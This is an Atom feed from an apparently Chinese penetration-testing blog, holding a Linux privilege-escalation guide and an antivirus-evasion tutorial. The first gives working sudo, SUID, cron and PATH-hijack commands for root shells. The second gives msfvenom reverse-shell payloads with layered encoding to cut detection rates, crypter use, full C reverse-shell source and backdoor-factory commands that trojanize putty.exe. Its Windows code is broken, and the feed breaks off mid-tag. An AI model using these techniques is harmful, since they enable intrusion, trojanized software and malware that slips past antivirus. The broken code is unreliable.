<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2020-04-30T03:20:53.982Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux提权总结(一)</title>
    <link href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-jie-yi/"/>
    <id>https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-jie-yi/</id>
    <published>2020-04-29T06:01:42.000Z</published>
    <updated>2020-04-30T03:20:53.982Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux提权综述</title>
    <link href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/"/>
    <id>https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/</id>
    <published>2020-04-29T06:01:07.000Z</published>
    <updated>2020-04-30T03:20:53.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p><p>，要判断我们应该先对系统相关的信息进行收集。</p><h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>已经拿到低权限shell</li><li>目标系统上有gcc</li><li>有上传文件的权限</li></ul><p><strong>使用命令</strong>：</p><pre><code>uname -a  或  uname -r</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p><p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p><p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p><p>这里在推荐一个很好用的工具</p><h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p>举个例子：</p><pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 3.0.0Kernel local: 3.0.0Possible Exploits:[+] semtex   CVE-2013-2094   Source: www.exploit-db.com/download/25444/‎[+] memodipper   CVE-2012-0056   Source: http://www.exploit-db.com/exploits/18411/[+] perf_swevent   CVE-2013-2094   Source: http://www.exploit-db.com/download/26131</code></pre><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul><li>找到具备利用条件的exp</li><li>上传源代码</li><li>编译exp后执行</li></ul><h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><pre><code>漏洞描述：漏洞编号：CVE-2016-5195漏洞名称：脏牛（Dirty COW）漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权影响范围：Linux kernel &gt;=2.6.22 并且Android也受影响</code></pre><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p><p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p><p>passwd 文件：</p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p><pre><code>ls -l /etc/passwd /etc/shadow</code></pre><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul><li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li><li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li></ul><h4 id="4、sudo-滥用"><a href="#4、sudo-滥用" class="headerlink" title="4、sudo 滥用"></a><strong>4、sudo 滥用</strong></h4><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p><p><code>sudo -l</code></p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p><p>可以支持所有命令，下面参考这个网址:</p><blockquote><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p></blockquote><p>这里以 awk、man 举例</p><p><strong>1、su</strong></p><blockquote><p>sudo su</p></blockquote><p>输入普通权限用户密码，切换为 root</p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p><p><strong>2、awk</strong></p><blockquote><p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p></blockquote><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p><p><strong>3、man</strong></p><blockquote><p>sudo man man</p></blockquote><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p><blockquote></blockquote><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote><p>ls -l /etc/cron*</p></blockquote><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p><p><strong>重写 python</strong></p><p>若这些计划任务的脚本可写，则编辑为 shell</p><p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p><p>测试：</p><blockquote><p>cat /etc/crontab</p></blockquote><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p><p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p><blockquote><p>ls -al /tmp/1.py //查看是否有w权限 </p><p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p></blockquote><p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p><p>原本是没有 /tmp/sh</p><p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p><p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p><p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p><p><strong>防范：</strong> </p><p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p><p>​    suid提权：</p><p>​    利用拥有suid的文件执行命令，从而提升权限至root</p><h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>查找系统上运行的所有SUID可执行文件：</p><pre><code>1. find / -user root -perm -4000 -print 2&gt;/dev/null2. find / -perm -u=s -type f 2&gt;/dev/null3. find / -user root -perm -4000 -exec ls -ldb {} \;</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p><h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><p>交互模式可以通过执行Nmap参数” interactive “</p><pre><code>nmap --interactive</code></pre><p>以下命令将提供一个提升的shell。</p><pre><code>nmap&gt; !shsh-3.2# whoamiroot</code></pre><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><pre><code>exploit/unix/local/setuid_nmap</code></pre><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><pre><code>touch pentestlabfind pentestlab -exec whoami \;</code></pre><pre><code>touch getflagfind / -type f -name getflag -exec &quot;whoami&quot; \;find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p><pre><code>vim.tiny /etc/shadow</code></pre><pre><code>vim.tiny# Press ESC key:set shell=/bin/sh:shell</code></pre><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p><pre><code>bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv</code></pre><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p><pre><code>less /etc/passwd!/bin/sh</code></pre><h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p><p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p><p><strong>测试：</strong></p><p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p><pre class=" language-javascript"><code class="language-javascript">    cat <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>ls <span class="token operator">&lt;</span><span class="token operator">&lt;</span>EOF      #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python      print <span class="token string">"this is not the true cat"</span>      print <span class="token string">"here is a root shell!"</span>      <span class="token keyword">import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>      EOF</code></pre><p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p><h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p><p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p><h4 id="11、服务漏洞"><a href="#11、服务漏洞" class="headerlink" title="11、服务漏洞"></a><strong>11、服务漏洞</strong></h4><blockquote><p>netstat -antup #查看各种网络服务 </p></blockquote><p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p><p><strong>1、redis 反弹 shell</strong></p><p>nc 单向转发</p><blockquote><p>nc -l 12345 | nc 192.168.191.170 80</p></blockquote><p>双向转发</p><blockquote><p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p></blockquote><p>双向转发本人测试失败，希望大佬们提供解决的办法</p><p>socat</p><p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p><blockquote><p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p></blockquote><p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p><blockquote><p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux提权方法综述&quot;&gt;&lt;a href=&quot;#linux提权方法综述&quot; class=&quot;headerlink&quot; title=&quot;linux提权方法综述&quot;&gt;&lt;/a&gt;linux提权方法综述&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>重定向技术</title>
    <link href="https://shu1l.github.io/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/"/>
    <id>https://shu1l.github.io/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/</id>
    <published>2020-04-28T13:20:28.000Z</published>
    <updated>2020-04-30T03:20:53.986Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>渗透测试之免杀入门</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</id>
    <published>2020-04-28T13:18:46.000Z</published>
    <updated>2020-04-30T03:20:53.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装<ul><li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li></ul></li></ul><h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul><li>恶意程序最主要的防护手段<ul><li>杀毒软件/防病毒软件</li><li>客户端/服务器/邮件防病毒</li></ul></li><li>检测原理<ul><li>基于二进制文件中特征签名的黑名单检测方法</li><li>基于行为的分析方法（启发式）</li></ul></li><li>事后手段<ul><li>永远落后于病毒发展</li></ul></li></ul><h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密是的特征字符不可读，从而逃避AV 检测</li><li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器 cripter 的特征字符</li></ul></li></ul><h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul><li>恶意软件制造者<ul><li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li><li>使用独有 crypter 软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable 还最高追求 （FUD）</li></ul></li><li>AV 厂商<ul><li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li><li>一般新的恶意软件安全 UD 窗口期是一周左右</li><li>乐毅软件制造者永无休止的拉锯战</li><li>信的启发式检测技术尚有待完善(误杀漏杀)</li></ul></li><li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul><li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul><li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li></ul></li><li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li><li>在线多引擎查杀网站与 AV 查杀共享信息</li><li>搞黑的在线多引擎查毒站<ul><li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li>常用的 RAT 软件<ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul></li></ul><h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul><li>生成反弹 shell</li></ul><pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><ul><li>加密编码反弹 shell</li></ul><pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.132 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o b.exe</code></pre><ul><li>比较编码前后的检测率<ul><li>未经过编码的 a.exe 检测率是 45%</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p><h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul><li>利用模板隐藏 shell</li></ul><pre><code>  root@kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o c.exe</code></pre><ul><li>多重编码</li></ul><pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</code></pre><ul><li><p>比较编码前后的检测率</p><ul><li>未经过编码的 c.exe 检测率是 40%</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p><ul><li>经过编码的 d.exe 检测率是 30%</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p></li></ul><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li><li>Hyperion （32bit PE 程序加密器）</li><li>Crypter / Container（解密器 PE Loader ）</li></ul><pre><code>  root@kali:~# git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip  root@kali:~# unzip Hyperion-1.2.zip  root@kali:~# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32  # 生成加密器  root@kali:~# cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe  # 生成木马程序  root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe  # 对木马程序进行加密  root@kali:~# wine h.exe p.exe x.exe</code></pre><ul><li><p>比较编码前后的检测率</p><ul><li>未经过编码的 p.exe 检测率是 45%</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p></li><li><p>未经过编码的 x.exe 检测率是 37%</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p><h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul><li>Windows reverse shell</li></ul><pre><code>  root@kali:~# wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><ul><li>Linux shellg’c’c</li></ul><pre><code>  root@kali:~# gcc linux_revers_shell.c -o linux  # 测试程序  root@kali:~# nc -nvlp 333  root@kali:~# ./linux 127.0.0.1 333</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p><ul><li>linux_revers_shell.c</li></ul><pre><code>  #include &lt;stdio.h&gt;  #include &lt;sys/socket.h&gt;  #include &lt;arpa/inet.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;netinet/in.h&gt;  int main(int argc, char *argv[])  {      struct sockaddr_in sock;      int s;      if (argc != 3)      {          fprintf(stderr, &quot;uso: 192.168.153.166 4444\n&quot;); exit(1);      }      sock.sin_family  = AF_INET;      sock.sin_port = htons(atoi(argv[2]));      sock.sin_addr.s_addr = inet_addr(argv[1]);      s = socket(AF_INET, SOCK_STREAM, 0);      connect(s,(struct sockaddr_in *)&amp;sock, sizeof(struct sockaddr_in));      dup2(s,0);      dup2(s,1);      dup2(s,2);      execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0); //precess httpd  }</code></pre><ul><li>windows.c</li></ul><pre><code>  # 未修正错误  #include &lt;winsock2.h&gt;  #include &lt;stdio.h&gt;  #pragma comment(lib,&quot;ws2_32&quot;)      WSADATA wsaData;      SOCKET Winsock;      SOOKET Sock;      struct sockaddr_in hax;      char ip_addr[16];      STARTUPINFO ini_processo;      PROCESS_INFORMATION processo_info;  int main(int argc,char *argv[])      WSAStartup(MAKEWORD(2,2), wsaData);      winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);      if (argc != 3)      {fprintf(stderr,&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;;) exit(1);}      struct hostent *host;      host = gethostbyname(argv [1] );      strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));      hax.sin_family = AF_INET;      hax.sin_port = htons(atoi(argv[2]));      hax.sin_addr.s_addr = inet_addr(ip_addr);      WSAConnect(Winsock,(SOCKADDR* &amp;hax,sizeof(hax),NULL,NULL,NULL,NULL;      memset(&amp;ini_processo,0,sizeof(ini_processo));      ini_processo.cb = sizeof(ini_processo);      ini_processo.dwFlags = START_USESTDHANDLES;      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;      CreateProcess(NULL,&quot;cmd exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;process_info);</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p><h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>patch<ul><li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>bdf：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法 patch</li><li>存在一定概率问价你会被 patch 坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li><li>支持 msf payload、自定义 payload</li></ul></li><li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li><li>python 语言编写</li><li>msf 使用的 patch 方法<ul><li>覆盖程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp</li></ul></li><li>创建新的线程执行 shellcode 并跳回原程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp –k</li><li>增加代码片段跳转执行后跳回源程序入口</li></ul></li></ul></li><li>CTP 方法<ul><li>增加新的代码段 session，与 smf 的-k 方法类似</li><li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li></ul></li><li>代码洞<ul><li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li><li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li></ul></li><li>单个代码洞代销不足以存放完整的 shellcode<ul><li>多代码洞跳转（非顺序执行）<ul><li>初期免杀率可达100%</li></ul></li><li>结合 msf 的 stager 方法</li></ul></li><li>patch 选项<ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码注入</li></ul></li><li>BDF 基本使用<ul><li>检查二进制文件是否支持代码注入<ul><li>backdoor-factory -f putty.exe –S</li></ul></li><li>显示可用 payload<ul><li>backdoor-factory -f putty.exe -s show</li><li>backdoor-factory -f <code>which nc</code> -s show</li><li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li><li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li><li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li></ul></li><li>查看 cave 大小<ul><li>ackdoor-factory -f putty.exe -c -l</li></ul></li></ul></li><li>免杀效果对比<ul><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li></ul></li><li>与 veil-evasion 集成</li><li>Linux：backdoor-factory -f putty.exe -s show</li><li>IAT：import address table</li><li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li></ul><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>-S：检查二进制文件是否支持代码注入</p><pre><code>  root@kali:~# backdoor-factory -f putty.exe –S</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li></ul><pre><code>  -c：code cave(代码裂缝)  -l：代码裂缝大小  root@kali:~# backdoor-factory -f putty.exe -c -l 200</code></pre><p><img 